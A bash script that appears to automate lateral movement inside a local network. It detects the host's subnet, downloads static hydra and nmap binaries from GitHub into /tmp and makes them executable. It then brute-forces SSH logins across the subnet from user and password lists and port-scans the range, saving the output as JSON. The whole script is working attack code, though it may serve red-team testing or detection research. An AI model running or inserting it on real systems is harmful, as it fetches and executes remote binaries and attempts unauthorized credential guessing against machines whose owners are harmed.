#!/bin/bash

LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
echo $LOCAL_NET > /tmp/hydra-targets.txt
echo $LOCAL_NET > /tmp/nmap-targets.txt
python3 -m pip install jc
curl -LJ https://github.com/credibleforce/static-hydra/raw/main/binaries/linux/x86_64/hydra -o /tmp/hydra && chmod 755 /tmp/hydra
/tmp/hydra -V -L /tmp/users.txt -P /tmp/passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh | tee /tmp/hydra.txt
curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
/tmp/nmap -sT --top-ports -oX /tmp/scan.xml -iL /tmp/nmap-targets.txt $LOCAL_NET | jc --xml -p | tee /tmp/scan.json